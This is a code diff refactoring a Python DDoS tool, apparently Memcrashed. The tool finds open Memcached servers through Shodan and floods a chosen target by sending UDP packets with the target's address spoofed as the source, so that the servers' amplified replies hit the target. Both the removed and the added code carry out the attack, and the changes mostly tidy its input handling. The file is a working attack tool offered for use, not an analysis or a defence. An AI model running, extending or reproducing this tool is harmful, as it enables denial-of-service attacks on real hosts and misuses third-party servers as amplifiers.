@@ -1,9 +1,16 @@
 #-- coding: utf8 --
 #!/usr/bin/env python3
-import sys, os, time, shodan
+import sys
+import os
+import time
+import shodan
+import ipaddress
+import logging
 from pathlib import Path
 from scapy.all import *
 from contextlib import contextmanager, redirect_stdout
+
+logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
 starttime = time.time()
 
@@ -13,11 +20,18 @@ def suppress_stdout():
         with redirect_stdout(devnull):
             yield
 
-class color:
+def is_valid_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
+
+class Color:
     HEADER = '\033[0m'
 
 keys = Path("./api.txt")
-logo = color.HEADER + '''
+logo = Color.HEADER + '''
 
    ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
    ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
@@ -43,138 +57,78 @@ print(logo)
 
 if keys.is_file():
     with open('api.txt', 'r') as file:
-        SHODAN_API_KEY=file.readline().rstrip('\n')
+        SHODAN_API_KEY = file.readline().strip()
 else:
-    file = open('api.txt', 'w')
-    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
-    file.write(SHODAN_API_KEY)
-    print('[~] File written: ./api.txt')
-    file.close()
+    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
+    with open('api.txt', 'w') as file:
+        file.write(SHODAN_API_KEY)
+        print('[~] File written: ./api.txt')
 
 while True:
     api = shodan.Shodan(SHODAN_API_KEY)
-    print('')
     try:
         myresults = Path("./bots.txt")
         query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
         if query.startswith('y'):
-            print('')
-            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
-            results = api.search('product:"Memcached" port:11211')
-            print('[✓] API Key Authentication: SUCCESS')
-            print('[~] Number of bots: %s' % results['total'])
-            print('')
-            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
-            if saveresult.startswith('y'):
-                file2 = open('bots.txt', 'a')
-                for result in results['matches']:
-                    file2.write(result['ip_str'] + "\n")
-                print('[~] File written: ./bots.txt')
-                print('')
-                file2.close()
-        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
-        if myresults.is_file():
-            if saveme.startswith('y'):
-                with open('bots.txt') as my_file:
-                    ip_array = [line.rstrip() for line in my_file]
-        else:
-            print('')
-            print('[✘] Error: No bots stored locally, bots.txt file not found!')
-            print('')
-        if saveme.startswith('y') or query.startswith('y'):
-            print('')
-            target = input("[▸] Enter target IP address: ")
-            targetport = input("[▸] Enter target port number (Default 80): ") or "80"
-            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
-            print('')
-            data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
-                dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
-                setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
-                getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
-                print("[+] Payload transformed: ", dataset)
-            print('')
-            if query.startswith('y'):
-                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
-                if iplist.startswith('y'):
-                    print('')
-                    counter= int(0)
-                    for result in results['matches']:
-                        host = api.host('%s' % result['ip_str'])
-                        counter=counter+1
-                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
-                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
-            if saveme.startswith('y'):
-                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
-                if iplistlocal.startswith('y'):
-                    print('')
-                    counter= int(0)
-                    for x in ip_array:
-                        host = api.host('%s' % x)
-                        counter=counter+1
-                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
-                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
-            print('')
-            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
-            if engage.startswith('y'):
-                if saveme.startswith('y'):
-                    for i in ip_array:
-                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
-                            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
-                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
-                        else:
-                            if power>1:
-                                print('[+] Sending %d forged UDP packets to: %s' % (power, i))
-                                with suppress_stdout():
-                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
-                            elif power==1:
-                                print('[+] Sending 1 forged UDP packet to: %s' % i)
-                                with suppress_stdout():
-                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
-                else:
-                    for result in results['matches']:
-                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
-                            print('[+] Sending 2 forged synchronized payloads to: %s' % (result['ip_str']))
-                            with suppress_stdout():
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
-                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
-                        else:
-                            if power>1:
-                                print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-                                with suppress_stdout():
-                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
-                            elif power==1:
-                                print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-                                with suppress_stdout():
-                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
-                print('')
-                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
-                break
-            else:
-                print('')
-                print('[✘] Error: %s not engaged!' % target)
-                print('[~] Restarting Platform! Please wait.')
-                print('')
-        else:
-            print('')
-            print('[✘] Error: No bots stored locally or remotely on Shodan!')
-            print('[~] Restarting Platform! Please wait.')
-            print('')
+            print('[~] Checking Shodan.io API Key...')
+            try:
+                results = api.search('product:"Memcached" port:11211')
+                print('[✓] API Key Authentication: SUCCESS')
+                print('[~] Number of bots: %s' % results['total'])
+                saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
+                if saveresult.startswith('y'):
+                    with open('bots.txt', 'w') as file2:
+                        for result in results['matches']:
+                            file2.write(result['ip_str'] + "\n")
+                    print('[~] File written: ./bots.txt')
+            except shodan.APIError as e:
+                print(f'[✘] Error: {e}')
+                continue
 
-    except shodan.APIError as e:
-            print('[✘] Error: %s' % e)
-            option = input('[*] Would you like to change API Key? <Y/n>: ').lower()
-            if option.startswith('y'):
-                file = open('api.txt', 'w')
-                SHODAN_API_KEY = input('[*] Please enter valid Shodan.io API Key: ')
-                file.write(SHODAN_API_KEY)
-                print('[~] File written: ./api.txt')
-                file.close()
-                print('[~] Restarting Platform! Please wait.')
-                print('')
-            else:
-                print('')
-                print('[•] Exiting Platform. Have a wonderful day.')
-                break
+        if myresults.is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
+            with open('bots.txt') as my_file:
+                ip_array = [line.strip() for line in my_file if is_valid_ip(line.strip())]
+        else:
+            ip_array = []
+            print('[✘] Error: No valid bots found in bots.txt')
+
+        if not ip_array:
+            print('[✘] No valid bots available. Exiting...')
+            break
+
+        target = input("[▸] Enter target IP address: ").strip()
+        if not is_valid_ip(target):
+            print('[✘] Invalid target IP address. Exiting...')
+            break
+
+        try:
+            targetport = int(input("[▸] Enter target port number (Default 80): ") or 80)
+        except ValueError:
+            print('[✘] Invalid target port. Exiting...')
+            break
+
+        try:
+            power = int(input("[▸] Enter preferred power (Default 1): ") or 1)
+        except ValueError:
+            print('[✘] Invalid power value. Exiting...')
+            break
+
+        data = input("[+] Enter payload contained inside packet (Default stats): ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+
+        engage = input(f'[*] Ready to engage target {target}? <Y/n>: ').lower()
+        if not engage.startswith('y'):
+            print('[✘] Engagement canceled. Exiting...')
+            break
+
+        print('[*] Sending packets...')
+        for ip in ip_array:
+            print(f'[+] Sending forged payloads to: {ip}')
+            with suppress_stdout():
+                send(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), count=power)
+
+        print('[✓] Task complete! Exiting platform.')
+        break
+
+    except Exception as e:
+        logging.error(f'Unexpected error: {e}')
+        break
